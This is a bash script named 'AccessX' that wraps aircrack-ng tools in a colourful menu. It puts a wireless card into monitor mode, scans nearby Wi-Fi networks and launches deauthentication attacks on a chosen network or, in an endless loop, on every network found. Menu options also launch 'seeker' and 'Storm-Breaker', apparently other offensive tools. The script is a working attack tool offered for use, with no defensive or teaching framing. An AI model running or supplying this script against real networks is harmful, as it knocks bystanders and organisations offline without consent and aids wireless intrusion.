#!/bin/bash

# Function to display the banner
display_banner() {
    clear
    echo -e "\e[1;31m█████╗  ██████╗ ██████╗███████╗ ██████╗██╗  ██╗\e[0m"
    echo -e "\e[1;32m██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██║  ██║\e[0m"
    echo -e "\e[1;34m███████║██║     ██║     █████╗  ██║     ███████║\e[0m"
    echo -e "\e[1;33m██╔══██║██║     ██║     ██╔══╝  ██║     ██╔══██║\e[0m"
    echo -e "\e[1;35m██║  ██║╚██████╗╚██████╗███████╗╚██████╗██║  ██║\e[0m"
    echo -e "\e[1;36m╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝ ╚═════╝╚═╝  ╚═╝\e[0m"
    echo -e "\e[1;37m       Created by Deadbrat - AccessX\e[0m"
    echo "---------------------------------------------"
}

# Function to check if monitor mode is enabled
is_monitor_mode_enabled() {
    if iwconfig 2>&1 | grep -q "Mode:Monitor"; then
        return 0
    else
        return 1
    fi
}

# Function to enable monitor mode
enable_monitor_mode() {
    echo -e "\e[1;32mEnabling monitor mode...\e[0m"
    sudo airmon-ng check kill > /dev/null 2>&1
    sudo airmon-ng start wlan0 > /dev/null 2>&1
    if is_monitor_mode_enabled; then
        echo -e "\e[1;32mMonitor mode enabled on wlan0mon.\e[0m"
    else
        echo -e "\e[1;31mFailed to enable monitor mode. Please check your wireless interface.\e[0m"
        exit 1
    fi
}

# Function to disable monitor mode
disable_monitor_mode() {
    echo -e "\e[1;32mDisabling monitor mode...\e[0m"
    sudo airmon-ng stop wlan0mon > /dev/null 2>&1
    echo -e "\e[1;32mMonitor mode disabled. Network interface returned to normal mode.\e[0m"
}

# Function to scan Wi-Fi networks
scan_networks() {
    echo -e "\e[1;32mScanning nearby Wi-Fi networks...\e[0m"
    echo -e "\e[1;33mPress Ctrl+C to stop scanning.\e[0m"

    # Use airodump-ng to scan networks and capture BSSID, SSID, Channel, and Signal Strength
    sudo airodump-ng wlan0mon --output-format csv -w scan_output --write-interval 1 > /dev/null 2>&1 &
    sleep 10
    sudo killall airodump-ng > /dev/null 2>&1

    # Parse the CSV file to display the results
    echo -e "\e[1;34mIndex  BSSID              Channel  Signal  SSID\e[0m"
    awk -F, 'NR>1 {printf "%-6s %-18s %-8s %-7s %s\n", NR-1, $1, $4, $6, $14}' scan_output-01.csv > networks.txt
    cat networks.txt
}

# Function to perform deauthentication
deauthenticate() {
    echo -e "\e[1;31mEnter the index of the network to deauthenticate: \e[0m"
    read index

    # Extract BSSID and Channel from the networks.txt file
    bssid=$(awk -v idx="$index" 'NR==idx+1 {print $2}' networks.txt)
    channel=$(awk -v idx="$index" 'NR==idx+1 {print $3}' networks.txt)

    if [[ -z "$bssid" || -z "$channel" ]]; then
        echo -e "\e[1;31mInvalid index! Please try again.\e[0m"
        return
    fi

    echo -e "\e[1;32mStarting deauthentication attack on $bssid (Channel $channel)...\e[0m"
    echo -e "\e[1;33mPress Ctrl+C to stop the attack.\e[0m"
    sudo airodump-ng --bssid $bssid --channel $channel wlan0mon > /dev/null 2>&1 &
    sleep 5
    sudo aireplay-ng --deauth 0 -a $bssid wlan0mon > /dev/null 2>&1
}

# Function to deauthenticate all devices on all networks
deauthenticate_all() {
    echo -e "\e[1;32mStarting deauthentication attack on all networks...\e[0m"
    echo -e "\e[1;33mPress Ctrl+C to stop the attack.\e[0m"

    while true; do
        for bssid in $(awk '{print $2}' networks.txt); do
            channel=$(awk -v bssid="$bssid" '$2 == bssid {print $3}' networks.txt)
            echo -e "\e[1;32mDeauthenticating devices on $bssid (Channel $channel)...\e[0m"
            sudo aireplay-ng --deauth 10 -a $bssid wlan0mon > /dev/null 2>&1
        done
        sleep 5
    done
}

# Main menu
main_menu() {
    while true; do
        display_banner
        echo -e "\e[1;34m1. Scan Wi-Fi Networks"
        echo "2. Deauthenticate a Specific Network"
        echo "3. Deauthenticate All Networks"
        echo "4. Enable Monitor Mode"
        echo "5. Disable Monitor Mode"
        echo "6. Run seeker"
        echo "7. Run Storm-Breaker"
        echo "8. Exit\e[0m"
        echo -e "\e[1;35mChoose an option: \e[0m"
        read choice

        case $choice in
            1)
                if ! is_monitor_mode_enabled; then
                    echo -e "\e[1;31mMonitor mode is not enabled. Enabling it now...\e[0m"
                    enable_monitor_mode
                fi
                scan_networks
                ;;
            2)
                if ! is_monitor_mode_enabled; then
                    echo -e "\e[1;31mMonitor mode is not enabled. Enabling it now...\e[0m"
                    enable_monitor_mode
                fi
                if [[ ! -f "networks.txt" ]]; then
                    echo -e "\e[1;31mNo networks scanned yet. Please scan networks first.\e[0m"
                    continue
                fi
                deauthenticate
                ;;
            3)
                if ! is_monitor_mode_enabled; then
                    echo -e "\e[1;31mMonitor mode is not enabled. Enabling it now...\e[0m"
                    enable_monitor_mode
                fi
                if [[ ! -f "networks.txt" ]]; then
                    echo -e "\e[1;31mNo networks scanned yet. Please scan networks first.\e[0m"
                    continue
                fi
                deauthenticate_all
                ;;
            4)
                enable_monitor_mode
                ;;
            5)
                disable_monitor_mode
                ;;
            6)
                echo -e "\e[1;32mRunning seeker...\e[0m"
                seeker
                ;;
            7)
                echo -e "\e[1;32mRunning Storm-Breaker...\e[0m"
                Storm-Breaker
                ;;
            8)
                echo -e "\e[1;31mExiting...\e[0m"
                exit 0
                ;;
            *)
                echo -e "\e[1;31mInvalid option! Please try again.\e[0m"
                ;;
        esac
    done
}

# Start the script
main_menu
